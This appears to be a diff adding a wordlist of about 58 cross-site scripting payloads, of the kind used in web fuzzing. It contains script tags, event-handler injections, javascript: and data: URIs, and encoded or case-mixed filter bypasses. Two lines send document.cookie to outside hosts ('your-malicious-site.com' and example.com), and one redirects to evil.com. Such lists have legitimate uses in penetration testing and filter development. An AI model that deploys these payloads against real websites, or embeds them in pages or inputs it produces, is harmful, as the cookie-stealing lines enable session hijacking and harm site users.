@@ -1,0 +1,58 @@
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+'"><script>alert(String.fromCharCode(88,83,83))</script>
+"><svg/onload=alert('XSS')>
+"><iframe src="javascript:alert('XSS')"></iframe>
+"><body onload=alert('XSS')>
+"><input onfocus=alert('XSS') autofocus>
+"><button onclick=alert('XSS')>Click</button>
+"><div onmouseover=alert('XSS')>Hover Me</div>
+"><a href="javascript:alert('XSS')">Click</a>
+"><script>document.location='http://example.com/'+document.cookie</script>
+"><img src='javascript:alert("XSS")'>
+"><a href="data:text/html,<script>alert('XSS')</script>">Click</a>
+"><script>alert('\u0058\u0053\u0053')</script>
+"><svg%0Aonload=%0Aalert('XSS')>
+"><iframe%0Asrc="javascript:alert('XSS')">
+"><script>alert('XSS')</script>
+"><!--`--><script>alert('XSS')</script>
+"><script>document.write('<img src=x onerror=alert("XSS")>')</script>
+"><script>eval('alert("XSS")')</script>
+"},"test": "<svg/onload=alert('XSS')>}"
+"><svg/onload=alert('XSS')>
+"><svg onload=alert`XSS`>
+"><svg/onload=alert&lpar;'XSS'&rpar;>
+"><script src=data:text/javascript,alert('XSS')></script>
+"><svg xmlns='http://www.w3.org/2000/svg' onload=alert('XSS')>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><script>setTimeout('alert(1)')</script>
+"><script>fetch('//your-malicious-site.com/'+document.cookie)</script>
+"><script>history.pushState(0,0,'//evil.com')</script>
+"><script>Object.defineProperty(document,'cookie',{get:()=>{alert('XSS')}})</script>
+"><svg/onload=\u0061lert('XSS')>
+"><svg/onload=&#97;lert('XSS')>
+"><img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
+"><iframe src="javascript:%61%6C%65%72%74%28%27XSS%27%29">
+"><a href="javascript:alert('XSS')">Click</a>
+"><body onresize=alert('XSS')>
+"><iframe srcdoc="<script>alert('XSS')</script>">
+"><input onfocus=alert('XSS') autofocus>
+"><div style="width:expression(alert('XSS'));">
+"><span onmouseover=alert('XSS')>Hover me</span>
+"><div onpointerdown=alert('XSS')>Click here</div>
+"><video onloadeddata=alert('XSS')><source src=video.mp4></video>
+"><marquee onstart=alert('XSS')>XSS</marquee>
+"><object data="javascript:alert('XSS')"></object>
+"><img src=x oneonerror="javascript:alert('XSS')" >
+"><div data-test="<svg/onload=alert('XSS')>">XSS</div>
+"><form><input name="name" value=x onfocus=alert(1) autofocus></form>
+<svg><script>['al','ert'].join('')+'(1)'</script>
+<s><sVg oNlOAd=alert('XSS')>
+</s><input/onfocus=alert(1) autofocus>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<svg/oNLoAd=alert`1`>
+<sVg oNlOaD=prompt(1)>
+'"><svg/onload=alert`XSS`>
+`"><script>alert(/XSS/)</script>
+"}]},"test": "<svg/onload=alert('XSS')>//"
+" onmouseover=alert('XSS') "
